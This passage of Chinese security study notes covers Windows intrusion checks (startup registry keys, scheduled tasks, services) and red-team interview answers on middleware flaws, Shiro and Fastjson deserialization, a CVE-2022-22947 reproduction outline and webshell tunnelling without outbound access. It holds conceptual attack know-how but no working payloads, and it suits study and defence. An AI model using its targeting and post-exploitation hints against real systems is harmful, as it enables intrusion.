a、登录服务器，单击【开始】>【所有程序】>【启动】，默认情况下此目录在是 

一个空目录，确认是否有非业务程序在该目录下。 

b、单击开始菜单>【运行】，输入 msconfig，查看是否存在命名异常的启动项目， 

是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。 

c、单击【开始】>【运行】，输入 regedit，打开注册表，查看开机启动项是否正 

常，特别注意如下三个注册表项： 

HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run 

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce 

检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀， 

清除残留病毒或木马。 

d、利用安全软件查看启动项、开机时间管理等。 

e、组策略，运行 gpedit.msc。 



### 30.6、检查计划任务

检查方法： 

a、单击【开始】>【设置】>【控制面板】>【任务计划】，查看计划任务属性，便 

可以发现木马文件的路径。 

b、单击【开始】>【运行】；输入 cmd，然后输入 at，检查计算机与网络上的其它 

计算机之间的会话或计划任务，如有，则确认是否为正常连接。 



### 30.7、服务自启动

检查方法：单击【开始】>【运行】，输入 services.msc，注意服务状态和启动类型， 

20检查是否有异常服务。 



### 30.8、查看系统版本以及补丁信息

检查方法：单击【开始】>【运行】，输入 systeminfo，查看系统信息 HW 项目经验 



### 30.9、查找可疑目录及文件

检查方法： 

a、查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用 

户目录。

Window 2003C:\Documents and Settings 

Window 2008R2C:\Users\ 

b、单击【开始】>【运行】，输入%UserProfile%\Recent，分析最近打开分析可 

疑文件。

c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。 























# 15、面试题（待看）



## 1、常见的中间件漏洞

IIS:解析漏洞、短文件名枚举、远程代码执行、PUT漏洞

Apache：解析漏洞、目录遍历、shiro反序列化漏洞

Nginx：解析漏洞、目录遍历、CRLF注入、目录穿越

Tomcat：示例目录、远程代码执行、反向路径遍历、war后门文件部署

Jboss：反序列化、war后门文件部署

web Logic：反序列化、SSRF任意文件上传





## 2、了解过反序列漏洞吗有没有复现过

php/java反序列化漏洞

（1）php中围绕着serialize()，unserialize()这两个函数，序列化就是把一个对象变成可以传输的字符串,如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了。

O:7:"chybeta":1:{s:4:"test";s:3:"123";}

这里的O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。"chybeta"表示对象的名称。1表示有一个值。{s:4:"test";s:3:"123";}中，s表示字符串，4表示该字符串的长度，"test"为字符串的名称，之后的类似。当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。

（2）JAVA Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。

（3）有复现过

复现过Spring Cloud Gateway远程代码执行漏洞复现(CVE-2022-22947)

首先：

1、开启vulfoucs并获取实验镜像

2、访问网页使用BurpSuite代理工具

3、构造并发送恶意的路由请求

测试结果：影响版本: 

Spring Cloud Gateway 3.1.x < 3.1.1
Spring Cloud Gateway 3.0.x < 3.0.7
旧的、不受支持的版本也会受到影响



## 3、打点一般会用什么漏洞

优先以java反序列化这些漏洞像shiro，fastjson，weblogic，用友oa等等进行打点，随后再找其他脆弱性易打进去的点。

因为javaweb程序运行都是以高权限有限运行，部分可能会降权。





## 4、平常怎么去发现shiro漏洞的

登陆失败时候会返回rememberMe=deleteMe字段或者使用shiroScan被动扫描去发现

完整：

未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段

登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段

不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段

勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段



## 5、shiro有几种漏洞类型

shiro 550

shiro 721



## 6、fastjson漏洞利用原理

在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。



## 7、weblogic有几种漏洞

weblogic就好多了，基于T3协议的反序列化；基于xml解析时候造成的反序列化，还有ssrf，权限绕过等等



## 8、IIOP听说过吗，和什么类似

java RMI通信，也就是远程方法调用，默认是使用jrmp协议，也可以选择IIOP。



## 9、这几个漏洞不出网情况下怎么办

让这几个漏洞回显



## 10、拿到webshell不出网情况下怎么办

reg上传去正向连接。探测出网协议，如dns，icmp



## 11、php序列化

php中围绕着serialize()，unserialize()这两个函数，序列化就是把一个对象变成可以传输的字符串,如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了。

O:7:"chybeta":1:{s:4:"test";s:3:"123";}

（这里的O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。中，s表示字符串，4表示该字符串的长度，"test"为字符串的名称，之后的类似。当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。）























